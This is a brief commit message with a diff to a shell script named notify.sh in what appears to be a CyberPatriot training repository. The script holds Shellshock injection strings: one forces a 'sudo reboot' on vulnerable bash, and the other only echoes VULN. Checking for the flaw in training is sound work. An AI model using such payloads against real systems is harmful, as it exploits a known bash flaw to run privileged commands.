History fix, UbuntuWeb 1.0, Tuna 0.1
Rewrote part of history because .gitignore error.

UbuntuWeb is officially 1.0!

Tuna Linux is 0.1

+++ CyberPatriot/files/notify.sh
@@ -1,4 +1,8 @@
 #!/bin/bash
 # Author: Bailey Kasin
 
-x='() { :;}; echo "PWNd" && /usr/bin/sudo reboot' bash -c :
+if [ $# -eq 0 ]; then
+    x='() { :;}; echo "PWNd" && /usr/bin/sudo reboot' bash -c :
+else
+  x='() { :;}; echo VULN' bash -c :
+fi
